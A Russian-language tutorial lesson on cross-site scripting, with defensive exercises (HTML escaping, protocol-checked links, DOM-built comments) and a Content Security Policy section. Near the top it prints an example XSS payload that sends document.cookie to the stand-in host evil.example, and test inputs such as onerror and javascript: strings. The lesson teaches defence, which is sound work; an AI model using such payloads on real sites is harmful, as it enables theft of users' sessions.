XSS: чужой скрипт на вашей странице

Cross-Site Scripting — злоумышленник добивается, чтобы на вашей странице выполнился его JavaScript. Тогда он может всё, что может ваш код: читать localStorage, отправлять запросы от имени пользователя, менять страницу. Виды: хранимая (комментарий со скриптом сохранился в базе и показывается всем), отражённая (скрипт в параметре адреса сразу выводится на страницу), DOM-based (свой же клиентский код вставляет данные из адреса в DOM).

// уязвимо: имя из адреса попадает в HTML как разметка
title.innerHTML = `Привет, ${new URLSearchParams(location.search).get('name')}`;
// ?name=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">

Защита от XSS

  1. Вставляйте данные как текст: textContent, а не innerHTML; setAttribute для атрибутов. Фреймворки (React, Vue) экранируют текст сами — опасны только их «сырые» вставки вроде dangerouslySetInnerHTML.
  2. Если нужна разметка от пользователя (форматированный комментарий) — очищайте её библиотекой-санитайзером по белому списку тегов (например, DOMPurify — из общих знаний), а не своими регулярными выражениями.
  3. Ссылки проверяйте по протоколу: href="javascript:..." выполняет код. Разрешайте только http: и https:.
  4. Content Security Policy — второй слой (ниже).

Подробно с примерами на DOM — урок DOM: найти, создать, изменить.

Задача 2. Экранирование HTML ★☆☆ разминка

Напишите escapeHtml(text), которая заменяет &, <, >, " и ' на HTML-сущности. Результат можно безопасно вставить и в текст элемента, и в значение атрибута в кавычках.

Зачем: иногда HTML собирают строкой: шаблон письма, серверный рендеринг. Тогда каждое значение от пользователя обязано пройти экранирование. Пропущенная кавычка — и атрибут title="..." превращается в title="" onmouseover="...".

Решение и разбор
const MAP: Record<string, string> = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

export const escapeHtml = (text: string): string => text.replace(/[&<>"']/g, (ch) => MAP[ch]!);

Одна замена с регулярным выражением по всем символам сразу. Цепочка .replace('&')...replace('<') тоже работает, но только если & заменяется первым. Иначе уже готовые &lt; испортятся. Экранирование для HTML не защищает в других контекстах: внутри <script>, в href (там нужна проверка протокола, следующая задача) и в CSS действуют свои правила.

Задача 3. Безопасная ссылка от пользователя ★★☆ практика

В профиле пользователь указывает свой сайт. Напишите safeHref(input, base): возвращает абсолютный адрес, если протокол http: или https: (относительные адреса разрешаются относительно base), иначе "#". Проверьте на javascript: с пробелами и разным регистром и на data:.

Зачем: textContent не помогает, когда данные — значение атрибута href: ссылка javascript:... выполнит код по клику. Проверка строкой (startsWith('javascript')) обходится пробелами, табуляцией и регистром. Разбор через URL нормализует адрес так же, как браузер.

Решение и разбор
export function safeHref(input: string, base: string): string {
  try {
    const url = new URL(input.trim(), base);
    return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : '#';
  } catch {
    return '#';
  }
}

Белый список протоколов вместо чёрного: неизвестно, какие ещё схемы появятся (vbscript:, data:), а разрешённых всего две. new URL сам удаляет управляющие символы и приводит схему к нижнему регистру, поэтому " JaVaScRiPt:alert(1)" честно распознаётся как javascript:. Некорректный адрес бросает TypeError, отсюда try.

Задача 4. Комментарий без innerHTML ★★☆ практика

Напишите renderComment(comment), которая возвращает элемент article с автором (ссылка на его сайт через safeHref из прошлой задачи) и текстом. Никакого innerHTML с данными. Проверьте на авторе <img src=x onerror=alert(1)> и сайте javascript:alert(1).

// href.ts
export function safeHref(input: string, base: string): string {
  try { const u = new URL(input.trim(), base); return u.protocol === 'http:' || u.protocol === 'https:' ? u.href : '#'; } catch { return '#'; }
}

Зачем: это хранимая XSS в чистом виде: комментарий один раз сохранён и показывается всем посетителям. Сборка элементов через DOM API делает инъекцию невозможной по построению, а не благодаря аккуратности.

Решение и разбор
import { safeHref } from './href.js';

export interface Comment {
  author: string;
  site: string;
  text: string;
}

export function renderComment(c: Comment, base = 'https://shop.example/'): HTMLElement {
  const article = document.createElement('article');
  const link = document.createElement('a');
  link.href = safeHref(c.site, base);
  link.rel = 'nofollow noopener';
  link.textContent = c.author;
  const text = document.createElement('p');
  text.textContent = c.text;
  article.append(link, text);
  return article;
}

textContent вставляет строку как текст: <img> появится на экране буквами, браузер не создаст тег. rel="nofollow" говорит поисковикам не продвигать ссылку (спамеры любят комментарии), а noopener не даёт открытой странице управлять вашей через window.opener. Тест проверяет, что в документе не появилось ни одного img.

Content Security Policy

CSP — заголовок ответа, которым сервер говорит браузеру, откуда можно загружать и выполнять скрипты, стили, картинки:

Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'

С такой политикой встроенные скрипты и обработчики вида onerror="..." не выполняются, даже если злоумышленник сумел вставить их в HTML. Политика не исправляет уязвимость, а ограничивает ущерб. Начинают обычно с заголовка Content-Security-Policy-Report-Only: он только сообщает о нарушениях и ничего не ломает.
